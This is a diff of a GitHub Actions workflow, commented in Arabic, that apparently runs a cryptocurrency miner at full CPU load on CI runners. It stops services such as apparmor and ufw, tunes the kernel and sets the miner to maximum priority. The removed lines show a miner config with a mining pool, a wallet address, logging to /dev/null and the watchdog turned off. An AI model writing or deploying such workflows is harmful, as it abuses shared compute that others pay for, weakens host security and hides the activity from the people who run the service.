@@ -12,17 +12,12 @@ jobs:
       - name: Ultimate System Optimization
         run: |
           sudo apt update
-          sudo apt install -y wget tar cpulimit htop numactl taskset curl bc screen
+          sudo apt install -y wget tar cpulimit htop curl bc screen
           
           echo "💥 تطبيق تحسينات CPU المتطورة..."
           
           # تفعيل وضع الأداء القصوى
-          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
-          
-          # تعطيل إدارة الطاقة للمعالج
-          for i in /sys/devices/system/cpu/cpu*/cpuidle/state*/disable; do
-            echo "1" | sudo tee $i > /dev/null 2>/dev/null || true
-          done
+          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
           
           # تحسين إعدادات الذاكرة والنظام
           sudo sysctl -w vm.swappiness=1
@@ -30,8 +25,6 @@ jobs:
           sudo sysctl -w vm.dirty_background_ratio=1
           sudo sysctl -w vm.vfs_cache_pressure=50
           sudo sysctl -w kernel.numa_balancing=0
-          sudo sysctl -w kernel.sched_migration_cost_ns=5000000
-          sudo sysctl -w kernel.sched_min_granularity_ns=10000000
           
           # تعطيل الخدمات غير الضرورية
           sudo systemctl stop snapd systemd-resolved apparmor ufw motd-news chrony 2>/dev/null || true
@@ -57,26 +50,6 @@ jobs:
           THREADS=$TOTAL_CORES
           echo "🎯 استخدام كل الأنوية: $THREADS"
           echo "THREADS=$THREADS" >> $GITHUB_ENV
-          
-          # إنشاء إعدادات مخصصة للأداء القصوى
-          cat > miner/aggressive_config.conf << EOF
-          ; إعدادات عدوانية للتعدين
-          algorithm=yescryptr16
-          pool=stratum+tcps://na.rplant.xyz:17057
-          wallet=GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v
-          cpu-threads=$THREADS
-          cpu-threads-priority=5
-          cpu-affinity=0
-          cpu-max-threads-hint=100
-          keepalive=true
-          retries=999
-          retry-pause=1
-          timeout=0
-          donate-level=0
-          no-watchdog=true
-          no-color=true
-          log-file=/dev/null
-          EOF
 
       - name: Launch 100% CPU Miner
         run: |
@@ -108,8 +81,7 @@ jobs:
               
               # ضبط أولوية قصوى
               renice -n -20 $MINER_PID
-              ionice -c 1 -n 0 -p $MINER_PID
-              chrt -p 99 $MINER_PID 2>/dev/null || true
+              echo "   ✅ تم ضبط أولوية العملية: $MINER_PID"
             done
           }
           
@@ -176,19 +148,19 @@ jobs:
             
             while true; do
               # فحص استخدام كل نواة فردية
-              CORE_USAGE=$(mpstat -P ALL 1 1 | awk '/Average:/ && $2 ~ /[0-9]/ {print $3}')
+              CORE_USAGE=$(mpstat -P ALL 1 1 2>/dev/null | awk '/Average:/ && $2 ~ /[0-9]/ {print $3}' || echo "100")
               CORE_INDEX=0
-              LOW_LOAD_CORES=""
+              LOW_LOAD_CORES=0
               
               for usage in $CORE_USAGE; do
                 if (( $(echo "$usage < 95" | bc -l) )); then
-                  LOW_LOAD_CORES="$LOW_LOAD_CORES $CORE_INDEX"
+                  ((LOW_LOAD_CORES++))
                 fi
                 ((CORE_INDEX++))
               done
               
-              if [ ! -z "$LOW_LOAD_CORES" ]; then
-                echo "⚠️  أنوية بأداء منخفض:$LOW_LOAD_CORES"
+              if [ $LOW_LOAD_CORES -gt 2 ]; then
+                echo "⚠️  اكتشاف $LOW_LOAD_CORES أنوية بأداء منخفض"
                 echo "🔄 إعادة توزيع الحمل..."
                 
                 # إعادة تشغيل الماينر مع إعدادات محسنة
@@ -247,7 +219,7 @@ jobs:
             # إعادة ضبط النظام كل ساعة
             if [ $((minute % 60)) -eq 0 ]; then
               echo "🔄 إعادة ضبط نظام دورية..."
-              echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
+              echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
               sync
               echo 3 | sudo tee /proc/sys/vm/drop_caches
             fi
@@ -288,7 +260,6 @@ jobs:
               
             OVERDRIVE_PID=$!
             renice -n -20 $OVERDRIVE_PID
-            ionice -c 1 -n 0 -p $OVERDRIVE_PID
             echo "   💥 عملية Overdrive $i: PID $OVERDRIVE_PID"
           done
           
